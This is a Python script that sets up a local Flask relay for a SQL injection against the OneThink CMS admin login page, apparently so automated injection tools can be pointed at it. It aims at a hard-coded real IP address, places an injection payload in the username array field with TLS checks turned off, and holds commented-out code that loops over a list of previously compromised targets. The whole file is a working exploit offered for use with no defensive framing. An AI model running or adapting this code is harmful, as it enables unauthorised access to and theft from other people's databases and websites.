# encoding: utf-8
# writer: yuejinjianke
import colorama
from flask import Flask,request,jsonify
import requests
import urllib3
urllib3.disable_warnings()


def title():
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN + '+                          onethink启动                        +')
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.BLUE +  '+        writer:          yuejinjianke                        +')
    print('\n')

def remote_login(payload):

    target_url = 'http://121.41.50.126/index.php?s=/admin/public/login.html'
    print(target_url)
    headers ={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    pay = ") =' {} ')-- -".format(payload) # )={payload} ）1 = 1
    print(colorama.Fore.GREEN + "[*] 远程payload为" + pay)
    data = {
        "act": "verify", "username[0]": 'exp', "username[1]": pay, "password": "", "verify": ""
    }
    resp = requests.post(url=target_url,headers=headers,data=data,verify=False)
    return resp.text

app = Flask(__name__)
@app.route('/')
def login():
    # url = []
    # with open("onethink_success.txt","r",encoding="utf-8") as fp:
    #     targets = fp.readlines()
    #     for target in targets:
    #         url.append(target.strip())
    payload = request.args.get("id")
    print(colorama.Fore.GREEN + "[*] 本地payload为: " + payload)
    response = remote_login(payload)
    return response

if __name__ == '__main__':
    title()
    app.run()

